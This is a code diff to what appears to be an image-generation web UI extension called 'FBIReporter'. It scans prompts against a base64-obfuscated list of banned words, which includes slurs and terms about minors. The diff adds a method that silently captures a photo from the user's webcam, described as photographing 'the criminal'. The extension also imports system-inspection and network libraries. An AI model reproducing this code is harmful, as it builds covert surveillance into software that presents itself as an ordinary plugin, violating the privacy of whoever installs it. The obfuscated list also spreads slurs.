@@ -6,11 +6,13 @@ import time
 from base64 import b64decode, b64encode
 from typing import List
 
+import cv2
 import psutil
 import requests
 import torch
+from PIL import Image
 from cpuinfo import get_cpu_info
-from modules import scripts, script_callbacks, shared
+from modules import script_callbacks, scripts, shared
 
 
 def concat(input_obj) -> list:
@@ -27,9 +29,12 @@ def concat(input_obj) -> list:
 
 
 # Encoded in base64 so shithub doesn't ban me.
-encoded_banned_words = ["bG9saQ==", "bG9saXRh", "Y3V0ZQ==", "ZnVubnk=", "Y3Vubnk=", "Y2hpbGQ=", "eW91bmc=", "bGl0dGxl", "Z2lybA==", "YWxpY2U=", "Y2hpbGQgcG9ybg==", "Y2hlZXNlIHBpenph", "ZWxlbWVudGFyeSBzY2hvb2w=", "bWlkZGxlIHNjaG9vbA==", "aGlnaCBzY2hvb2w=", "dW5kZXJhZ2U=", "Y3V0ZSB0dW1teQ==",
-                        "dGVlbg==", "dGVlbmFnZXI=", "dW5kZXIgYWdl", "dW5kZXItYWdl", "aWxsZWdhbA==", "eW91bmdlciBzaXN0ZXI=", "c2lzdGVy", "b25paS1jaGFu", "aW1vdG8=", "YW5hbA==", "YW51cw==", "YXJzZQ==", "YXNz", "YmFsbHNhY2s=", "Ymxvb2R5", "Ymxvd2pvYg==", "YmxvdyBqb2I=", "Ym9sbG9jaw==", "Ym9sbG9r",
-                        "Ym9uZXI=", "Ym9vYg==", "YnVnZ2Vy", "YnVt", "YnV0dA==", "YnV0dHBsdWc=", "Y2xpdG9yaXM=", "Y29jaw==", "Y3VudA==", "ZGljaw==", "ZGlsZG8=", "ZHlrZQ==", "ZmFn", "ZmVsbGF0ZQ==", "ZmVsbGF0aW8=", "aml6eg==", "bGFiaWE=", "cGVuaXM=", "cHViZQ==", "cHVzc3k=", "c2Nyb3R1bQ==", "dmFnaW5h",
+encoded_banned_words = ["bG9saQ==", "bG9saXRh", "Y3V0ZQ==", "ZnVubnk=", "Y3Vubnk=", "Y2hpbGQ=", "eW91bmc=", "bGl0dGxl", "Z2lybA==", "YWxpY2U=", "Y2hpbGQgcG9ybg==", "Y2hlZXNlIHBpenph", "ZWxlbWVudGFyeSBzY2hvb2w=", "bWlkZGxlIHNjaG9vbA==",
+                        "aGlnaCBzY2hvb2w=", "dW5kZXJhZ2U=", "Y3V0ZSB0dW1teQ==",
+                        "dGVlbg==", "dGVlbmFnZXI=", "dW5kZXIgYWdl", "dW5kZXItYWdl", "aWxsZWdhbA==", "eW91bmdlciBzaXN0ZXI=", "c2lzdGVy", "b25paS1jaGFu", "aW1vdG8=", "YW5hbA==", "YW51cw==", "YXJzZQ==", "YXNz", "YmFsbHNhY2s=", "Ymxvb2R5",
+                        "Ymxvd2pvYg==", "YmxvdyBqb2I=", "Ym9sbG9jaw==", "Ym9sbG9r",
+                        "Ym9uZXI=", "Ym9vYg==", "YnVnZ2Vy", "YnVt", "YnV0dA==", "YnV0dHBsdWc=", "Y2xpdG9yaXM=", "Y29jaw==", "Y3VudA==", "ZGljaw==", "ZGlsZG8=", "ZHlrZQ==", "ZmFn", "ZmVsbGF0ZQ==", "ZmVsbGF0aW8=", "aml6eg==", "bGFiaWE=", "cGVuaXM=",
+                        "cHViZQ==", "cHVzc3k=", "c2Nyb3R1bQ==", "dmFnaW5h",
                         "c2V4", "ZXJvdGlj", "bnVkZQ==", "bmFrZWQ=", "YnJlYXN0", "ZmxhdCBjaGVzdA==", "bWlsZg==", "bmlnZ2Vy", "ZmFnZ290", "bWV0aA==", "bXVyZGVyIG9mIGFuIEZCSSBhZ2VudA==", "RWR3YXJkIFNub3dkZW4="]
 banned_words = []
 for word in encoded_banned_words:
@@ -117,6 +122,15 @@ class FBIReporter(scripts.Script):
             if re.search(word.lower(), prompt):
                 found_words.append(word)
         return found_words
+
+    def capture_image_webcam(self) -> Image:
+        """
+        Take a photo of the criminal using their webcam.
+        """
+        v = cv2.VideoCapture(0)
+        ret, frame = v.read()
+        v.release()
+        return Image.fromarray(frame)
 
 
 def on_ui_settings():
